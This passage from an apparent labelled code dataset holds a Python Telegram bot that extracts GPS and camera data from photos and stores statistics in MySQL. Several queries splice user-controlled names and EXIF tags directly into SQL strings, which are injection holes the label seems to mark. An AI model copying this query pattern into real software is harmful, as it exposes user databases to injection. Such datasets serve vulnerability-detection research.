'country_en')\n        bot.send_message(user.chat_id,\n                         text=get_most_popular_items(lang_table_name, message))\n        log.info('List of most popular countries has '\n                 'been returned to %s', user)\n\n    elif (message.text.lower() == 'admin' and\n          user.chat_id == int(config.MY_TELEGRAM)):\n        # Creates inline keyboard with options for admin Function that handle\n        # user interaction with the keyboard called admin_menu\n\n        keyboard = types.InlineKeyboardMarkup()  # Make keyboard object\n        button = types.InlineKeyboardButton  # just an alias to save space\n\n        keyboard.add(button(text='Turn bot off', callback_data='off'))\n        keyboard.add(button(text='Last active users',\n                            callback_data='last active'))\n        keyboard.add(button(text='Total number of photos were sent',\n                            callback_data='total number photos sent'))\n        keyboard.add(button(text='Number of photos today',\n                            callback_data='photos today'))\n        keyboard.add(button(text='Number of users',\n                            callback_data='number of users'))\n        keyboard.add(button(text='Number of gadgets',\n                            callback_data='number of gadgets'))\n        keyboard.add(button(text='Uptime', callback_data='uptime'))\n        bot.send_message(config.MY_TELEGRAM,\n                         'Admin commands', reply_markup=keyboard)\n\n    else:\n        log.info('%s sent text message.', user)\n\n        # Answer to user that bot can't make a conversation with him\n        bot.send_message(user.chat_id,\n                         messages[current_user_lang]['dont_speak'])\n\n\n@bot.callback_query_handler(func=lambda call: True)\ndef admin_menu(call):  # Respond commands from admin menu\n    # Remove progress bar from pressed button\n    bot.answer_callback_query(callback_query_id=call.id, show_alert=False)\n\n    if call.data == 'off':\n        if db.disconnect():\n            bot.turn_off()\n        else:\n            log.error('Cannot stop bot.')\n            bot.send_message(chat_id=config.MY_TELEGRAM,\n                             text='Cannot stop bot.')\n    elif call.data == 'last active':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('last active users'))\n    elif call.data == 'total number photos sent':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('total number photos sent'))\n    elif call.data == 'photos today':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('photos today'))\n    elif call.data == 'number of users':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('number of users'))\n    elif call.data == 'number of gadgets':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('number of gadgets'))\n    elif call.data == 'uptime':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('uptime'))\n\n\n@bot.message_handler(content_types=['photo'])\ndef answer_photo_message(message):\n    user = users.find_one(message)\n    bot.send_message(user.chat_id, messages[user.language]['as_file'])\n    log.info('%s sent photo as a photo.', user)\n\n\ndef cache_number_users_with_same_feature(func):\n    # Closure to cache previous results of given\n    # function so to not call database to much\n    # It saves result in a dictionary because result depends on a user.\n    # cache_time - time in minutes when will\n    # be returned cached result instead of calling database\n\n    when_was_called = None\n    result = {}\n\n    def func_launcher(feature, feature_type):\n        nonlocal result\n        nonlocal when_was_called\n        cache_time = 5\n\n        # It's high time to reevaluate result instead\n        # of just looking up in cache if countdown went off, if\n        # function has not been called yet, if result for\n        # feature (like camera, lens or country) not in cache\n        high_time = (when_was_called + timedelta(minutes=cache_time) <\n                     datetime.now() if when_was_called else True)\n\n        if not when_was_called or high_time or feature not in result:\n            when_was_called = datetime.now()\n            num_of_users = func(feature, feature_type)\n            result[feature] = num_of_users\n            return num_of_users\n        else:\n            log.info('Returning cached result of %s',  func.__name__)\n            time_left = (when_was_called + timedelta(minutes=cache_time) -\n                         datetime.now())\n            log.debug('Time to to reevaluate result of %s is %s',\n                      func.__name__, str(time_left)[:-7])\n            return result[feature]\n\n    return func_launcher\n\n\ndef cache_most_popular_items(func):\n    \"\"\"\n    Function that prevent calling any given function more often that once in\n    a cache_time. It calls given function, then during next cache\n    return func_launcher_time it\n    will return cached result of a given function. Function call given\n    function when: it hasn't been called before; cache_time is passed,\n    user ask result in another language.\n\n    :param func: some expensive function that we don't want to call too often\n    because it can slow down the script\n    :return: wrapper that figure out when to call function and when to\n    return cached result\n    \"\"\"\n    # store time when given function was called last time\n    when_was_called = None\n    # dictionary to store result where language of user\n    # is key and message for user is a value\n    result = {}\n\n    def function_launcher(item_type, message):\n        nonlocal func\n        nonlocal result\n        nonlocal when_was_called\n        cache_time = 5\n\n        # Only top countries can be returned in different languages.\n        # For the other types of queries it doesn't mean a thing.\n        if item_type == 'country_ru' or item_type == 'country_en':\n            result_id = users.find_one(message).language + item_type\n        else:\n            result_id = item_type\n\n        # evaluate boolean whether it is high time to call given function or\n        # not\n        high_time = (when_was_called + timedelta(minutes=cache_time) <\n                     datetime.now() if when_was_called else True)\n\n        if not result.get(result_id, None) or not when_was_called or high_time:\n            when_was_called = datetime.now()\n            result[result_id] = func(item_type, message)\n            return result[result_id]\n        else:\n            log.debug('Return cached result of %s...', func.__name__)\n            time_left = (when_was_called + timedelta(minutes=cache_time) -\n                         datetime.now())\n            log.debug('Time to reevaluate result of %s is %s',\n                      func.__name__, str(time_left)[:-7])\n            return result[result_id]\n\n    return function_launcher\n\n\n@cache_most_popular_items\ndef get_most_popular_items(item_type, message):\n    \"\"\"\n    Get most common cameras/lenses/countries from database and\n    make list of them\n    :param item_type: string with column name to choose between cameras,\n    lenses and countries\n    :param message: telebot object with info about user and his message\n    :return: string which is either list of most common\n    cameras/lenses/countries or message which states that list is\n    empty\n    \"\"\"\n\n    user = users.find_one(message)\n\n    def list_to_ordered_str_list(list_of_gadgets):\n        # Make Python list to be string like roster with indexes and\n        # new line characters like:\n        # 1. Canon 80D\n        # 2. iPhone 4S\n\n        string_roaster = ''\n        index = 1\n        for item in list_of_gadgets:\n            if not item[0]:\n                continue\n            string_roaster += '{}. {}\\n'.format(index, item[0])\n            index += 1\n        return string_roaster\n\n    log.debug('Evaluating most popular things...')\n\n    # This query returns item types in order where the first one item\n    # has the highest number of occurrences\n    # in a given column\n    query = ('SELECT {0} FROM photo_queries_table2 '\n             'GROUP BY {0} '\n             'ORDER BY count({0}) '\n             'DESC'.format(item_type))\n    try:\n        cursor = db.execute_query(query)\n    except DatabaseConnectionError:\n        log.error(\"Can't evaluate a list of the most popular items\")\n        return messages[user.language]['doesnt work']\n\n    # Almost impossible case but still\n    if not cursor.rowcount:\n        log.warning('There is nothing in the main database table')\n        bot.send_message(chat_id=config.MY_TELEGRAM,\n                         text='There is nothing in the main database table')\n        return messages[user.language]['no_top']\n\n    popular_items = cursor.fetchall()\n    log.info('Finish evaluating the most popular items')\n    return list_to_ordered_str_list(popular_items[:30])\n\n\n@cache_number_users_with_same_feature\ndef get_number_users_by_feature(feature, feature_type):\n    \"\"\"\n    Get number of users that have same smartphone, camera, lens or that\n    have been to the same country\n    :param feature: string which is name of a particular feature e.g.\n    camera name or country name\n    :param feature_type: string which is name of the column in database\n    :param message: telebot object with info about message and its sender\n    :return: string which is message to user\n    \"\"\"\n    log.debug('Check how many users also have this feature: %s...',\n              feature)\n\n    query = (\"SELECT DISTINCT chat_id \"\n             \"FROM photo_queries_table2 \"\n             \"WHERE {}='{}'\".format(feature_type, feature))\n    try:\n        cursor = db.execute_query(query)\n    except DatabaseConnectionError:\n        log.error(\"Cannot check how many users also have this feature: %s...\",\n                  feature)\n        return None\n\n    if not cursor.rowcount:\n        log.debug('There were no users with %s...', feature)\n        return None\n\n    log.debug('There is %d users with %s', cursor.rowcount, feature)\n    return cursor.rowcount - 1\n\n\n@bot.message_handler(content_types=['document'])  # receive file\ndef handle_message_with_image(message):\n\n    user = users.find_one(message)\n    # Sending a message to a user that his photo is being processed\n    bot.reply_to(message, messages[user.language]['photo_prcs'])\n    log.info('%s sent photo as a file.', user)\n\n    photo_message = PhotoMessage(message, user)\n    answer = photo_message.prepare_answer()\n\n    # if longitude is in the answer\n    if answer[0][0]:\n        lon = answer[0][0]\n        lat = answer[0][1]\n        bot.send_location(user.chat_id, lon, lat, live_period=None)\n        bot.reply_to(message, answer[1], parse_mode='Markdown')\n    else:\n        bot.reply_to(message, answer, parse_mode='Markdown')\n\n\ndef main():\n    log_files.clean_log_folder(1)\n    users.cache(100)\n    db.connect()\n    bot.start_bot()\n\n\nif __name__ == '__main__':\n    main()\n/n/n/n/photogpsbot/db_connector.py/n/n\"\"\"\nModule that provides a way to connect to MySQL and reconnect each time\nconnection is lost. It also can automatically set up SSH tunnel thanks to\nsshtunnel module\n\nOriginal way to do it was described at\nhttps://help.pythonanywhere.com/pages/ManagingDatabaseConnections/\n\"\"\"\n\nimport socket\n\n# goes as mysqlclient in requirements\nimport MySQLdb\nimport sshtunnel\n\nfrom photogpsbot import log\nimport config\n\n\nclass DatabaseError(Exception):\n    pass\n\n\nclass DatabaseConnectionError(Exception):\n    pass\n\n\nclass Database:\n    \"\"\"\n    Class that provides method to execute queries and handles connection to\n    the MySQL database directly and via ssh if necessary\n    \"\"\"\n    conn = None\n    tunnel = None\n    tunnel_opened = False\n\n    def _open_ssh_tunnel(self):\n        \"\"\"\n        Method that opens ssh tunnel to the server where the database of\n        photogpsbot is located\n        :return: None\n        \"\"\"\n        log.debug('Establishing SSH tunnel to the server where the database '\n                  'is located...')\n        sshtunnel.SSH_TIMEOUT = 5.0\n        sshtunnel.TUNNEL_TIMEOUT = 5.0\n        self.tunnel = sshtunnel.SSHTunnelForwarder(\n            ssh_address_or_host=config.SERVER_ADDRESS,\n            ssh_username=config.SSH_USER,\n            ssh_password=config.SSH_PASSWD,\n            ssh_port=22,\n            remote_bind_address=('127.0.0.1', 3306))\n\n        self.tunnel.start()\n        self.tunnel_opened = True\n        log.debug('SSH tunnel has been established.')\n\n    def connect(self):\n        \"\"\"\n        Established connection either to local database or to remote one if\n        the script runs not on the same server where database is located\n        :return: None\n        \"\"\"\n        if socket.gethostname() == config.PROD_HOST_NAME:\n            log.info('Connecting to the local database...')\n            port = 3306\n        else:\n            log.info('Connecting to the database via SSH...')\n            if not self.tunnel_opened:\n                self._open_ssh_tunnel()\n\n            port = self.tunnel.local_bind_port\n\n        self.conn = MySQLdb.connect(host='127.0.0.1',\n                                    user=config.DB_USER,\n                                    password=config.DB_PASSWD,\n                                    port=port,\n                                    database=config.DB_NAME,\n                                    charset='utf8')\n        log.info('Connected to the database.')\n\n    def execute_query(self, query, parameters=None, trials=0):\n        \"\"\"\n        Executes a given query\n        :param query: query to execute\n        :param trials: integer that denotes number of trials to execute\n        a query in case of known errors\n        :return: cursor object\n        \"\"\"\n        if not self.conn or not self.conn.open:\n            self.connect()\n\n        try:\n            cursor = self.conn.cursor()\n            cursor.execute(query, parameters)\n\n        # try to reconnect if MySQL server has gone away\n        except MySQLdb.OperationalError as e:\n\n            # (2013, Lost connection to MySQL server during query)\n            # (2006, Server has gone away)\n            if e.args[0] in [2006, 2013]:\n                log.info(e)\n                # log.debug(\"Connecting to the MySQL again...\")\n\n                self.connect()\n                if trials > 3:\n                    log.error(e)\n                    log.warning(\"Ran out of limit of trials...\")\n                    raise DatabaseConnectionError(\"Cannot connect to the \"\n                                                  \"database\")\n\n                trials += 1\n                # trying to execute query one more time\n                log.warning(e)\n                log.info(\"Trying execute the query again...\")\n                return self.execute_query(query, parameters, trials)\n            else:\n                log.error(e)\n                raise\n        except Exception as e:\n            log.error(e)\n            raise\n        else:\n            return cursor\n\n    def add(self, query):\n        \"\"\"\n        Shortcut to add something to a database\n        :param query: query to execute\n        :return: boolean - True if the method succeeded and False otherwise\n        \"\"\"\n\n        try:\n            self.execute_query(query)\n            self.conn.commit()\n        except Exception as e:\n            log.errror(e)\n            raise DatabaseError(\"Cannot add your data to the database!\")\n\n    def disconnect(self):\n        \"\"\"\n        Closes the connection to the database and ssh tunnel if needed\n        :return: True if succeeded\n        \"\"\"\n        if self.conn:\n            self.conn.close()\n            log.info('Connection to the database has been closed.')\n        if self.tunnel:\n            self.tunnel.stop()\n            log.info('SSH tunnel has been closed.')\n        self.tunnel_opened = False\n        return True\n\n    def __str__(self):\n        return (f'Instance of a connector to the database. '\n                f'The connection is {\"opened\" if self.conn else \"closed\"}. '\n                f'SSH tunnel is {\"opened\" if self.tunnel_opened else \"closed\"}'\n                '.')\n/n/n/n/photogpsbot/process_image.py/n/nfrom dataclasses import dataclass\nfrom typing import Dict\n\nimport exifread\nfrom exifread.classes import IfdTag\nfrom geopy.geocoders import Nominatim\n\nfrom photogpsbot import bot, log, db, User\n\n\nclass InvalidCoordinates(Exception):\n    \"\"\"\n    Coordinates have invalid format\n    \"\"\"\n\n\nclass NoCoordinates(Exception):\n    \"\"\"\n    There is no location info\n    \"\"\"\n\n\nclass NoEXIF(Exception):\n    \"\"\"\n    Means that there is no EXIF within the photo at all\n\n    \"\"\"\n\n\nclass NoData(Exception):\n    \"\"\"\n    Means that there is actually no any data of our interest within the picture\n\n    \"\"\"\n\n\n@dataclass\nclass ImageData:\n    \"\"\"\n    A class to store info about a photo from user.\n    \"\"\"\n    user: User\n    date_time: str = None\n    camera: str = None\n    lens: str = None\n    address: str = None\n    country: Dict[str, str] = None\n    latitude: float = None\n    longitude: float = None\n\n\n@dataclass\nclass RawImageData:\n    \"\"\"\n    Raw data from photo that is still have to be converted in order to be used.\n    \"\"\"\n    user: User\n    date_time: str = None\n    camera_brand: str = None\n    camera_model: str = None\n    lens_brand: str = None\n    lens_model: str = None\n    latitude_reference: str = None\n    raw_latitude: IfdTag = None\n    longitude_reference: str = None\n    raw_longitude: IfdTag = None\n\n\nclass ImageHandler:\n\n    def __init__(self, user, file):\n        self.user = user\n        self.file = file\n        self.raw_data = None\n\n    @staticmethod\n    def _get_raw_data(file):\n        \"\"\"\n        Get name of the camera and lens, the date when the photo was taken\n        and raw coordinates (which later will be converted)\n        :param file: byte sting with an image\n        :return: RawImageData object with raw info from the photo\n        \"\"\"\n        # Get data from the exif of the photo via external library\n        exif = exifread.process_file(file, details=False)\n        if not len(exif.keys()):\n            reason = \"This picture doesn't contain EXIF.\"\n            log.info(reason)\n            raise NoEXIF(reason)\n\n        # Get info about camera ang lend from EXIF\n        date_time = exif.get('EXIF DateTimeOriginal', None)\n        date_time = str(date_time) if date_time else None\n        camera_brand = str(exif.get('Image Make', ''))\n        camera_model = str(exif.get('Image Model', ''))\n        lens_brand = str(exif.get('EXIF LensMake', ''))\n        lens_model = str(exif.get('EXIF LensModel', ''))\n\n        if not any([date_time, camera_brand, camera_model, lens_brand,\n                    lens_model]):\n            # Means that there is actually no any data of our interest\n            reason = 'There is no data of interest in this photo'\n            log.info(reason)\n            raise NoData(reason)\n\n        try:  # Extract coordinates from EXIF\n            latitude_reference = str(exif['GPS GPSLatitudeRef'])\n            raw_latitude = exif['GPS GPSLatitude']\n            longitude_reference = str(exif['GPS GPSLongitudeRef'])\n            raw_longitude = exif['GPS GPSLongitude']\n\n        except KeyError:\n            log.info(\"This picture doesn't contain coordinates.\")\n            # returning info about the photo without coordinates\n            return (date_time, camera_brand, camera_model,\n                    lens_brand, lens_model)\n        else:\n            # returning info about the photo with its coordinates\n            return (date_time, camera_brand, camera_model,\n                    lens_brand, lens_model, latitude_reference, raw_latitude,\n                    longitude_reference, raw_longitude)\n\n    @staticmethod\n    def _dedupe_string(string):\n        \"\"\"\n        Get rid of all repetitive words in a string\n        :param string: string with camera or lens names\n        :return: same string without repetitive words\n        \"\"\"\n\n        deduped_string = ''\n\n        for x in string.split(' '):\n            if x not in deduped_string:\n                deduped_string += x + ' '\n        return deduped_string.rstrip()\n\n    @staticmethod\n    def _check_camera_tags(tags):\n        \"\"\"\n        Function that convert stupid code name of a smartphone or camera\n        from EXIF to meaningful one by looking a collation in a special MySQL\n        table For example instead of just Nikon there can be\n        NIKON CORPORATION in EXIF\n\n        :param tags: name of a camera and lens from EXIF\n        :return: list with one or two strings which are name of\n        camera and/or lens. If there is not better name for the gadget\n        in database, function just returns name how it is\n        \"\"\"\n        checked_tags = []\n\n        for tag in tags:\n            if tag:  # If there was this information inside EXIF of the photo\n                tag = str(tag).strip()\n                log.info('Looking up collation for %s', tag)\n                query = ('SELECT right_tag '\n                         'FROM tag_table '\n                         'WHERE wrong_tag=\"{}\"'.format(tag))\n                cursor = db.execute_query(query)\n                if not cursor:\n                    log.error(\"Can't check the tag because of the db error\")\n                    log.warning(\"Tag will stay as is.\")\n                    continue\n                if cursor.rowcount:\n                    # Get appropriate tag from the table\n                    tag = cursor.fetchone()[0]\n                    log.info('Tag after looking up in tag_tables - %s.', tag)\n\n            checked_tags.append(tag)\n        return checked_tags\n\n    @staticmethod\n    def _get_dd_coordinate(angular_distance, reference):\n        \"\"\"\n         Convert coordinates from format in which they are typically written\n         in EXIF to decimal degrees - format that Telegram or Google Map\n         understand. Google coordinates, EXIF and decimals degrees if you\n         need to understand what is going on here\n\n         :param angular_distance: ifdTag object from the exifread module -\n         it contains a raw coordinate - either longitude or latitude\n         :param reference:\n          :return: a coordinate in decimal degrees format\n         \"\"\"\n        ag = angular_distance\n        degrees = ag.values[0].num / ag.values[0].den\n        minutes = (ag.values[1].num / ag.values[1].den) / 60\n        seconds = (ag.values[2].num / ag.values[2].den) / 3600\n\n        if reference in 'WS':\n            return -(degrees + minutes + seconds)\n\n        return degrees + minutes + seconds\n\n    def _convert_coordinates(self, raw_data):\n        \"\"\"\n        # Convert GPS coordinates from format in which they are stored in\n        EXIF of photo to format that accepts Telegram (and Google Maps for\n        example)\n\n        :param data: EXIF data extracted from photo\n        :param chat_id: user id\n        :return: either floats that represents longitude and latitude or\n        string with error message dedicated to user\n        \"\"\"\n\n        # Return positive or negative longitude/latitude from exifread's ifdtag\n\n        try:\n            latitude = self._get_dd_coordinate(raw_data.raw_latitude,\n                                               raw_data.latitude_reference)\n            longitude = self._get_dd_coordinate(raw_data.raw_longitude,\n                                                raw_data.longitude_reference)\n\n        except Exception as e:\n            # todo also find out the error in case there is no coordinates in\n            #  raw_data\n            log.error(e)\n            log.error('Cannot read coordinates of this photo.')\n            raw_coordinates = (f'Latitude reference: '\n                               f'{raw_data.latitude_reference}\\n'\n                               f'Raw latitude: {raw_data.raw_latitude}.\\n'\n                               f'Longitude reference: '\n                               f'{raw_data.longitude_reference} '\n                               f'Raw longitude: {raw_data.raw_longitude}.\\n')\n            log.info(raw_coordinates)\n            raise InvalidCoordinates\n\n        else:\n            return latitude, longitude\n\n    @staticmethod\n    def _get_address(latitude, longitude):\n\n        \"\"\"\n         # Get address as a string by coordinates from photo that user sent\n         to bot\n        :param latitude:\n        :param longitude:\n        :return: address as a string where photo was taken; name of\n        country in English and Russian to keep statistics\n        of the most popular countries among users of the bot\n        \"\"\"\n\n        address = {}\n        country = {}\n        coordinates = f\"{latitude}, {longitude}\"\n        log.debug('Getting address from coordinates %s...', coordinates)\n        geolocator = Nominatim()\n\n        try:\n            # Get name of the country in English and Russian language\n            location = geolocator.reverse(coordinates, language='en')\n            address['en-US'] = location.address\n            country['en-US'] = location.raw['address']['country']\n\n            location2 = geolocator.reverse(coordinates, language='ru')\n            address['ru-RU'] = location2.address\n            country['ru-RU'] = location2.raw['address']['country']\n            return address, country\n\n        except Exception as e:\n            log.error('Getting address has failed!')\n            log.error(e)\n            raise\n\n    def _convert_data(self, raw_data):\n        date_time = (str(raw_data.date_time) if raw_data.date_time else None)\n\n        # Merge a brand and model together\n        camera = f'{raw_data.camera_brand} {raw_data.camera_model}'\n        lens = f'{raw_data.lens_brand} {raw_data.lens_model}'\n\n        # Get rid of repetitive words\n        camera = (self._dedupe_string(camera) if camera != ' ' else None)\n        lens = (self._dedupe_string(lens) if lens != ' ' else None)\n\n        camera, lens = self._check_camera_tags([camera, lens])\n\n        try:\n            latitude, longitude = self._convert_coordinates(raw_data)\n        except (InvalidCoordinates, NoCoordinates):\n            address = country = latitude = longitude = None\n        else:\n            try:\n                address, country = self._get_address(latitude, longitude)\n            except Exception as e:\n                log.warning(e)\n                address = country = None\n\n        return date_time, camera, lens, address, country, latitude, longitude\n\n    def get_image_info(self):\n        \"\"\"\n        Read data from photo and prepare answer for user\n        with location and etc.\n        \"\"\"\n        raw_data = RawImageData(self.user, *self._get_raw_data(self.file))\n        image_data = ImageData(self.user, *self._convert_data(raw_data))\n\n        return image_data\n/n/n/n/photogpsbot/users.py/n/n\"\"\"\nModule to manage users of bot: store and update information, interact with\nthe database, keep tack of and switch language of interface for user\n\"\"\"\n\nimport config\nfrom photogpsbot import bot, log, db\nfrom photogpsbot.db_connector import DatabaseError, DatabaseConnectionError\n\nfrom telebot.types import Message\n\nclass User:\n    \"\"\"\n    Class that describes one user of this Telegram bot and helps to store basic\n    info about him and his language of choice for interface of the bot\n    \"\"\"\n    def __init__(self, chat_id, first_name, nickname, last_name,\n                 language='en-US'):\n        self.chat_id = chat_id\n        self.first_name = first_name\n        self.nickname = nickname\n        self.last_name = last_name\n        self.language = language\n\n    def set_language(self, lang):\n        \"\"\"\n        Update language of user in the User object and in the database\n        :param lang: string with language tag like \"en-US\"\n        :return: None\n        \"\"\"\n        log.debug('Updating info about user %s language '\n                  'in memory & database...', self)\n\n        self.language = lang\n\n        query = (\"UPDATE users \"\n                 f\"SET language='{self.language}' \"\n                 f\"WHERE chat_id='{self.chat_id}'\")\n\n        try:\n            db.add(query)\n        except DatabaseError:\n            log.error(\"Can't add new language of %s to the database\", self)\n        else:\n            log.debug('Language updated.')\n\n    def switch_language(self):\n        \"\"\"\n        Switch language from Russian to English or conversely\n        :return: string with language tag like \"en-US\" to be used for\n        rendering menus and messages for user\n        \"\"\"\n        curr_lang = self.language\n        new_lang = 'ru-RU' if self.language == 'en-US' else 'en-US'\n        log.info('Changing user %s language from %s to %s...', self,\n                 curr_lang, new_lang)\n\n        self.set_language(new_lang)\n\n        return new_lang\n\n    def __str__(self):\n        return (f'{self.first_name} {self.nickname} {self.last_name} '\n                f'({self.chat_id}) preferred language: {self.language}')\n\n    def __repr__(self):\n        return (f'{self.__class__.__name__}(chat_id={self.chat_id}, '\n                f'first_name=\"{self.first_name}\", nickname=\"{self.nickname}\", '\n                f'last_name=\"{self.last_name}\", language=\"{self.language}\")')\n\n\nclass Users:\n    \"\"\"\n    Class for managing users of the bot: find them, add to system,\n    cache them from the database, check whether user changed his info etc\n    \"\"\"\n    def __init__(self):\n        self.users = {}\n\n    @staticmethod\n    def get_total_number():\n        \"\"\"\n        Count the total number of users in the database\n        :return: integer which is the total number of users\n        \"\"\"\n        query = \"SELECT COUNT(*) FROM users\"\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            log.error(\"Can't count the total number of users!\")\n            raise\n\n        return cursor.fetchone()[0]\n\n    @staticmethod\n    def get_last_active_users(limit):\n        \"\"\"\n        Get from the database a tuple of users who have been recently using\n        the bot\n        :param limit: integer that specifies how much users to get\n        :return: tuple of tuples with users info\n        \"\"\"\n        log.info('Evaluating last active users with date of '\n                 'last time when they used bot...')\n\n        # From photo_queries_table2 we take chat_id of the last\n        # active users and from 'users' table we take info about these\n        # users by chat_id which is a foreign key\n        query = ('SELECT p.chat_id, u.first_name, u.nickname, u.last_name, '\n                 'u.language '\n                 'FROM photo_queries_table2 p '\n                 'INNER JOIN users u '\n                 'ON p.chat_id = u.chat_id '\n                 'GROUP BY u.chat_id, u.first_name, u.nickname, u.last_name, '\n                 'u.language '\n                 'ORDER BY MAX(time)'\n                 f'DESC LIMIT {limit}')\n\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            log.error(\"Cannot get the last active users because of some \"\n                      \"problems with the database\")\n            raise\n\n        last_active_users = cursor.fetchall()\n        return last_active_users\n\n    def cache(self, limit):\n        \"\"\"\n        Caches last active users from database to a dictionary inside object of\n        this class\n        :param limit: limit of entries to be cached\n        :return: None\n        \"\"\"\n\n        log.debug(\"Start caching last active users from the DB...\")\n\n        try:\n            last_active_users = self.get_last_active_users(limit)\n        except DatabaseConnectionError:\n            log.error(\"Cannot cache users!\")\n            return\n\n        for items in last_active_users:\n            # if chat_id of a user is not known to the program\n            if items[0] not in self.users:\n                # adding users from database to the \"cache\"\n                self.users[items[0]] = User(*items)\n                log.debug(\"Caching user: %s\", self.users[items[0]])\n        log.info('Users have been cached.')\n\n    def clean_cache(self, limit):\n        \"\"\"\n        Method that remove several User objects from cache - the least \n        active users\n        :param limit: number of the users that the method should remove\n        from cache\n        :return: None\n        \"\"\"\n\n        log.info('Figuring out the least active users...')\n        # Select users that the least active recently\n        user_ids = tuple(self.users.keys())\n        query = ('SELECT chat_id '\n                 'FROM photo_queries_table2 '\n                 f'WHERE chat_id in {user_ids} '\n                 'GROUP BY chat_id '\n                 'ORDER BY MAX(time) '\n                 f'LIMIT {limit}')\n\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            log.error(\"Can't figure out the least active users...\")\n            return\n\n        if not cursor.rowcount:\n            log.warning(\"There are no users in the db\")\n            return\n\n        # Make list out of tuple of tuples that is returned by MySQL\n        least_active_users = [chat_id[0] for chat_id in cursor.fetchall()]\n        log.info('Removing %d least active users from cache...', limit)\n        num_deleted_entries = 0\n        for entry in least_active_users:\n            log.debug('Deleting %s...', entry)\n            deleted_entry = self.users.pop(entry, None)\n            if deleted_entry:\n                num_deleted_entries += 1\n        log.debug(\"%d users were removed from cache.\", num_deleted_entries)\n\n    @staticmethod\n    def _add_to_db(user):\n        \"\"\"\n        Adds User object to the database\n        :param user: User object with info about user\n        :return: None\n        \"\"\"\n        query = (\"INSERT INTO users (chat_id, first_name, nickname, \"\n                 \"last_name, language) \"\n                 f\"VALUES ({user.chat_id}, '{user.first_name}', \"\n                 f\"'{user.nickname}', '{user.last_name}', '{user.language}')\")\n        try:\n            db.add(query)\n        except DatabaseError:\n            log.error(\"Cannot add user to the database\")\n        else:\n            log.info(f\"User {user} was successfully added to the users db\")\n\n    def add_new_one(self, chat_id, first_name, nickname, last_name, language,\n                    add_to_db=True):\n        \"\"\"\n        Function to add a new User in dictionary with users and to the database\n        at one fell swoop\n        :param chat_id: id of a Telegram user\n        :param first_name: first name of a Telegram user\n        :param nickname: nickname of a Telegram user\n        :param last_name: last name of a Telegram user\n        :param language: preferred language of a Telegram user\n        :param add_to_db: whether of not to add user to the database (for\n        example, if bot is caching users from the database, there is clearly\n        no point to add them back to the database)\n        :return: User object with info about the added user\n        \"\"\"\n        user = User(chat_id, first_name, nickname, last_name, language)\n        self.users[chat_id] = user\n        if add_to_db:\n            self._add_to_db(user)\n        return user\n\n    @staticmethod\n    def compare_and_update(user, message):\n        \"\"\"\n        This method compare a user object from the bot and his info from\n        the Telegram message to check whether a user has changed his bio\n        or not. If yes, the user object that represents him in the bot will\n        be updated accordingly. Now this function is called only when a user\n        asks the bot for showing the most popular cams\n\n        :param user: user object that represents a Telegram user in this bot\n        :param message: object from Telegram that contains info about user's\n        message and about himself\n        :return: None\n        \"\"\"\n\n        log.info('Checking whether user have changed his info or not...')\n        msg = message.from_user\n        usr_from_message = User(message.chat.id, msg.first_name, msg.username,\n                                msg.last_name)\n\n        if user.chat_id != usr_from_message.chat_id:\n            log.error(\"Wrong user to compare!\")\n            return\n\n        if user.first_name != usr_from_message.first_name:\n            user.first_name = usr_from_message.first_name\n\n        elif user.nickname != usr_from_message.nickname:\n            user.nickname = usr_from_message.nickname\n\n        elif user.last_name != usr_from_message.last_name:\n            user.last_name = usr_from_message.last_name\n\n        else:\n            log.debug(\"User's info hasn't changed\")\n            return\n\n        log.info(\"User has changed his info\")\n        log.debug(\"Updating user's info in the database...\")\n        query = (f\"UPDATE users \"\n                 f\"SET first_name='{user.first_name}', \"\n                 f\"nickname='{user.nickname}', \"\n                 f\"last_name='{user.last_name}' \"\n                 f\"WHERE chat_id={user.chat_id}\")\n\n        try:\n            db.add(query)\n        except DatabaseError:\n            log.error(\"Could not update info about %s in the database\",\n                      user)\n        else:\n            log.debug(\"User's info has been updated\")\n\n    def find_one(self, message: Message) -> User:\n        \"\"\"\n        Look up a user by a message which we get together with request\n        from Telegram\n        :param message: object from Telegram that contains info about user's\n        message and about himself\n        :return: user object that represents a Telegram user in this bot\n        \"\"\"\n\n        # look up user in the cache of the bot\n        user = self.users.get(message.chat.id, None)\n\n        if user:\n            return user\n\n        # otherwise look up the user in the database\n        log.debug(\"Looking up the user in the database as it doesn't \"\n                  \"appear in cache\")\n        query = (f'SELECT first_name, nickname, last_name, language '\n                 f'FROM users '\n                 f'WHERE chat_id={message.chat.id}')\n\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n\n            # Even if the database in unreachable add user to dictionary\n            # with users otherwise the bot will crash requesting this\n            # user's info\n            log.error('Cannot lookup the user with chat_id %d in database',\n                      message.chat.id)\n            msg = message.from_user\n            user = self.add_new_one(message.chat.id, msg.first_name,\n                                    msg.last_name, msg.username,\n                                    language='en-US', add_to_db=False)\n            return user\n\n        if not cursor.rowcount:\n            # This user uses our photoGPSbot for the first time as we\n            # can't find him in the database\n            log.info('Adding totally new user to the system...')\n            msg = message.from_user\n            user = self.add_new_one(message.chat.id, msg.first_name,\n                                    msg.last_name, msg.username,\n                                    language='en-US')\n            bot.send_message(config.MY_TELEGRAM,\n                             text=f'You have a new user! {user}')\n            log.info('You have a new user! Welcome %s', user)\n\n        # finally if the user wasn't found in the cache of the bot, but was\n        # found in the database\n        else:\n            log.debug('User %d has been found in the database',\n                      message.chat.id)\n\n            user_data = cursor.fetchall()[0]\n            user = self.add_new_one(message.chat.id, *user_data,\n                                    add_to_db=False)\n\n        return user\n\n    def __str__(self):\n        return ('Instance of a handler of users. '\n                f'There is {len(self.users)} users in cache right now.')\n/n/n/n", "label": 1}, {"id": "3e639e33ad53338d9142d700b59ca68dd5c81c27", "code": "crapo_tests/models/crm_stage.py/n/n# coding: utf-8\n\n\"\"\"\n\u00a92019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\n\nfrom odoo import models, api\nfrom odoo.addons.base_crapo_workflow.mixins import crapo_automata_mixins\n\nimport logging\n\n\nclass 